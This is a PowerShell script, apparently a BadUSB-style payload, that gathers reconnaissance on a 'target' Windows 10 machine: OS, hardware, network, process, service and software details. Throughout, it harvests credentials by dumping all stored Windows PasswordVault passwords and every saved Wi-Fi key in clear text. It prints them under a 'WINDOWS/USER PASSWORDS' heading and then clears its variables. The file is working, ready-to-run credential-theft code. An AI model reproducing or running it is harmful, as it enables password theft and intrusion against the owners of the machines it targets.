
#Author     : 0rion5 B3lt, (original creator Simen Kjeserud), Gachnang, Dannyk999
#Version    : v2.1
#Title      : Comprehensive Information Gathering
#Target     : Windows 10
#Description: Gathers all sorts of information on the target. Collects information like OS, Vendor, 
#Network Information, Hardware Details, Software Details, Process Details, WIFI passwords, USB device VID & PID, System BIOS Etc...
 

#################################################
#           Get - Basic Information
#################################################


#Windows Experience Score
$WindowsExprienceScore = (Get-CimInstance Win32_WinSAT).WinSPRLevel

#Get - Operating Sysytem & Computer Information
$ComputerOS = Get-WmiObject Win32_OperatingSystem 
$InstallDate = (Get-WmiObject Win32_OperatingSystem | Select-Object @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}}).InstallDate
$LastBootTime = (Get-WmiObject CIM_OperatingSystem | Select-Object @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}).LastBootUpTime
$LocalTime = (Get-WmiObject Win32_OperatingSystem | Select-Object @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}).LocalDateTime
$ComputerSystem = Get-CimInstance CIM_ComputerSystem
$ComputerSystemProduct = Get-CimInstance Win32_ComputerSystemProduct

#Get - Local User Accounts
$LocalUser = Get-WmiObject Win32_UserAccount | Select-Object Name, Caption, SID, AccountType | Format-Table -Wrap

#Get - Stored Credentials
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$Vault = New-Object Windows.Security.Credentials.PasswordVault 
$Vault = $Vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ }


#################################################
#           Get - Network Info                  #
#################################################


#Get - wifi SSIDs and Passwords	
$WLANProfileNames = @()

#Get - All the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach( $WLANProfileName in $Output ){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects = @()
#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){
    #Get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name = "$WLANProfileName" key = clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }
    Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
#Get - Remote Desktop Status
$RDP = $null
If ((Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} 
else {
	$RDP = "RDP is NOT enabled" 
}

#Get - Public IP
try {
    $PublicIPAddress = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content 
}
catch {
    $PublicIPAddress = "Error getting Public IP"
}

#Get - Computer IP (Usually the Ethernet Ip or the first IP after the Wireless IP.)
$ComputerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress.Length -gt 0} 

#Filter For MAC Address
$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | Where-Object {$_.IPEnabled}
$IsDHCPEnabled = $false

foreach ($Network in $Networks) {
    If($network.DHCPEnabled) {
        $IsDHCPEnabled = $true
  }
[string[]]$ComputerMAC = $Network.MACAddress
}

#Get - Network Interface IPs
$IPAddress = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | Where-Object {$_.IPEnabled} | Select-Object ServiceName, DHCPEnabled, DefaultIPGateway, IPAddress, MACaddress, Index, Description | Format-Table 

#Get - Network Interfaces
$NetworkAdapter = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null }  | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress -Wrap

#Get -Routing Table
$RoutingTable = Get-NetRoute | Where-Object {$_.AddressFamily -eq "IPv4"} | Select-Object InterfaceAlias, Protocol, DestinationPrefix,InterfaceMetric, InterfaceIndex, NextHop | Sort-Object InterfaceIndex | Format-Table


#################################################
#Get - Other Hardware Details (Com Ports, SD-Card readers, Hard Drives, RAM, CPU Etc.)
#################################################


#Get - Installed CPU Info
$BIOS = Get-CIMInstance win32_bios
$MainBoard = Get-WmiObject Win32_BaseBoard | Format-List
$MotherBoard = Get-WmiObject Win32_MotherboardDevice | Select-Object Name, PNPDeviceID, PrimaryBusType, SecondaryBusType, Status | Format-List
$ComputerProcessor = Get-WmiObject Win32_Processor | Select-Object  DeviceID, Name, Caption, Manufacturer, MaxClockSpeed | Format-List
$CacheMemory = Get-CimInstance Win32_CacheMemory | Select-Object Purpose, BlockSize, InstalledSize, MaxCacheSize | Format-List

#Get - Installed RAM
$RAMCapacity = Get-CimInstance Cim_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N1} GB" -f ($_.sum / 1GB)}
$RAMDetails = Get-CimInstance Cim_PhysicalMemory | Select-Object Manufacturer, PartNumber, SerialNumber, BankLabel, DeviceLocator, Speed, @{Name = "Capacity"; Expression = {"{0:N1} GB" -f ($_.Capacity / 1GB)}} | Format-Table

#Keyboard & Mouse Details
#Get - Keyboard
$Keyboard = Get-CimInstance CIM_Keyboard

#Get - Mouse
$PointingDevice = Get-CimInstance CIM_PointingDevice

#Get - Printers Installed
$Printers = Get-CimInstance Win32_PrinterConfiguration | Select-Object Name, PaperSize, DriverVersion

#Get - VideoCards
$Videocard = Get-WmiObject Win32_VideoController | Format-Table -wrap -property Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

#Get - Hard Disk Drives, CD-ROM Drives & Removable Drives
$DriveType = @{
   2 = "Removable disk "
   3 = "Fixed local disk "
   4 = "Network disk "
   5 = "Compact disk "
}
$HDDs = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table -wrap DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{Name="Size GB"; Expression={$_.Size_GB}; align="right";},@{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } 
#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table -Wrap


#################################################
#           Get - Software Details              #
#################################################


#Get - process first
$Process = Get-WmiObject Win32_Process | Select-Object Handle, ProcessName, ExecutablePath, CommandLine

#Get - Listeners / ActiveTcpConnections
$Listener = Get-NetTCPConnection | Select-Object @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$Listener = $Listener | ForEach-Object {
    $ListenerItem = $_
    $ProcessItem = ($Process | Where-Object { [int]$_.Handle -like [int]$ListenerItem.OwningProcess })
    New-Object PSObject -property @{
      "LocalAddress" = $ListenerItem.LocalAddress
      "RemoteAddress" = $ListenerItem.RemoteAddress
      "State" = $ListenerItem.State
      "AppliedSetting" = $ListenerItem.AppliedSetting
      "OwningProcess" = $ListenerItem.OwningProcess
      "ProcessName" = $ProcessItem.ProcessName
    }
} | Select-Object LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table -Wrap -Autosize

#Get - Process last
$Process = $Process | Sort-Object ProcessName | Format-Table  Handle, ProcessName, ExecutablePath, CommandLine

#Get - Service
$Service = Get-WmiObject win32_service | Select-Object State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table -wrap Name, DisplayName, PathName -GroupBy State

#Get - Installed software (get uninstaller)
$Software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -wrap #-GroupBy Publisher

#Get - Drivers
$Drivers = Get-WmiObject Win32_PnPSignedDriver| Where-Object { $_.DeviceName -notlike $null } | Select-Object DeviceName, FriendlyName, DriverProviderName | Sort-Object DriverProviderName | Format-Table -wrap 


###############################################################################################################################################
#OUTPUT FIELD\\\\\\\\\\////////////OUTPUT FIELD///////////\\\\\\\\\\\\\OUTPUT FIELD\\\\\\\\\\////////////OUTPUT FIELD///////////\\\\\\\\\\\\\\#
###############################################################################################################################################


Clear-Host
Start-Sleep -Seconds 1
Write-Host 

"=================================================================="
"========================BASIC    DETAILS=========================="
"=================================================================="
""
"COMPUTER NAME                 : " + $ComputerSystem.Name
"=================================================================="
"Operating System Installed    : " + $ComputerOS.Caption 
"Operating System Architecture : " + $ComputerOS.OSArchitecture
"Version                       : " + $ComputerOS.Version
"Windows Exerience Score       : " + $WindowsExprienceScore
"Serial Number                 : " + $ComputerOS.SerialNumber
"Install date                  : " + $InstallDate
"Last Boot                     : " + $LastBootTime
"Local Time                    : " + $LocalTime
""
"SYSTEM PRODUCT DETAILS"
"=================================================================="
"Vendor                        : " + $ComputerSystem.Manufacturer
"Model                         : " + $ComputerSystem.Model
"Identifying Number            : " + $ComputerSystemProduct.IdentifyingNumber
"UUID                          : " + $ComputerSystemProduct.UUID
"Name                          : " + $ComputerSystem.Name
"PrimaryOwnerName              : " + $ComputerSystem.PrimaryOwnerName
"Domain                        : " + $ComputerSystem.Domain
""
"USER DETAILS"
"==================================================================" + ($LocalUser | Out-String)
""
"WINDOWS/USER PASSWORDS"
"=================================================================="
$Vault | Select-Object Resource, UserName, Password | Sort-Object Resource | Format-Table -AutoSize
""
"NETWORK DETAILS"
"=================================================================="
""
"Public IP              : " + $PublicIPAddress
"Computer IP            : " + $ComputerIP.ipaddress[0]
"Computers MAC address  : " + $ComputerMAC
"Remote Desktop Enabled : " + $RDP
""
"WLAN PROFILES: "
"=================================================================="+ ($WLANProfileObjects| Out-String)
""
"CURRENT NETWORK INTERFACE DETAILS: "
"==================================================================" + ($IPAddress | Out-String)
""
"ALL NETWORK INTERFACE DETAILS: "
"==================================================================" + ($NetworkAdapter | Out-String)
""
"ROUTING TABLE DETAILS: "
"==================================================================" + ($RoutingTable | Out-String)
""
"=================================================================="
"========================HARDWARE DETAILS=========================="
"=================================================================="
""
"BIOS DETAILS: "
"=================================================================="+ ($BIOS | Out-String)
""
"MAINBOARD DETAILS: "
"==================================================================" + ($MainBoard + $MotherBoard | Out-String)
""
"PROCESSOR DETAILS: "
"==================================================================" + ($ComputerProcessor | Out-String) + ($CacheMemory | Out-String)
""
"RAM DETAILS: "
"=================================================================="
"Total Capacity: " + $RAMCapacity + ($RAMDetails | Out-String)
""
"HID DETAILS: "
"=================================================================="
"Mouse Details   :"
"Mouse Name : " + $PointingDevice.Name
"VID & PID  : " + $PointingDevice.DeviceID
""
"Keyboard Details: "
"Name       : " + $Keyboard.Name
"Description: " + $Keyboard.Description
"Layout     : " + $Keyboard.Layout
"VID & PID  : " + $Keyboard.DeviceID
""
"PRINTER DETAILS: "
"==================================================================" + ($Printers | Out-String)
""
"INSTALLED VIDEOCARDS: "
"==================================================================" + ($Videocard | out-string)
""
"STORAGE DETAILS: "
"==================================================================" + ($HDDs | Out-String)
""
"COM & SERIAL DEVICES"
"==================================================================" + ($COMDevices | Out-String)
""
"=================================================================="
"========================SOFTWARE DETAILS=========================="
"=================================================================="
""
"LISTENERS / ACTIVE TCP CONNECTIONS: "
"==================================================================" + ($Listener| out-string)
""
"CURRENT RUNNING PROCESS: "
"==================================================================" + ($Process| out-string)
""
"SERVICES: "
"==================================================================" + ($Service| Out-string)
""
"INSTALLED SOFTWARE:"
"==================================================================" + ($Software| Out-string)
""
"INSTALLED DRIVERS:"
"==================================================================" + ($Drivers| out-string)
""
#################################################
#                Get - Clean-Up                 #
#################################################
Remove-Variable -Name WindowsExprienceScore, ComputerOS, ComputerSystem, LocalUser,
Vault, WLANProfileNames,Output, WLANProfileName,WLANProfileObjects,
WLANProfilePassword,WLANProfileObject,RDP,PublicIPAddress, ComputerIP,
Networks,Network, IPAddress,NetworkAdapter,RoutingTable, BIOS, MainBoard, ComputerProcessor, 
RAMCapacity, RAMDetails, Printers, Videocard, DriveType, HDDs, COMDevices, Process, 
Listener, ListenerItem, ProcessItem, Process, Service, Software, Drivers, null -ErrorAction SilentlyContinue -Force
